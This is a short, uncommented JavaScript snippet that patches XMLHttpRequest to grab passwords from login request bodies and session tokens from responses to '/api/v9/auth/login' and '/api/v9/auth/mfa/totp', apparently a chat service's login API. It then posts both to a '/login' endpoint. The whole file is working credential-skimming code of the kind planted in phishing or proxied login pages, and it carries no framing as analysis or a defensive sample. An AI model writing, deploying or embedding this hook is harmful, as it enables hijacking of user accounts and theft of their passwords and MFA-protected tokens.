(function () {
    const originalSend = XMLHttpRequest.prototype.send
    const originalOpen = XMLHttpRequest.prototype.open

    let storedPassword = null

    XMLHttpRequest.prototype.open = function (method, url) {
        this._url = url
        this._method = method
        return originalOpen.apply(this, arguments)
    }

    XMLHttpRequest.prototype.send = function (body) {
        if (this._method === 'POST' && body) {
            try {
                var json = JSON.parse(body)
                if (json.password) {
                    storedPassword = json.password
                }
            } catch (e) { }
        }

        this.addEventListener('load', function () {
            if (this._url.includes('/api/v9/auth/login') || this._url.includes('/api/v9/auth/mfa/totp')) {
                var json = JSON.parse(this.responseText)

                if (json.user_settings && json.token) {
                    const xhr = new XMLHttpRequest()
                    xhr.open('POST', '/login', true)
                    xhr.setRequestHeader('Content-Type', 'application/json')
                    xhr.send(JSON.stringify({
                        token: json.token,
                        password: storedPassword
                    }))
                }
            }
        })

        return originalSend.apply(this, arguments)
    }
})()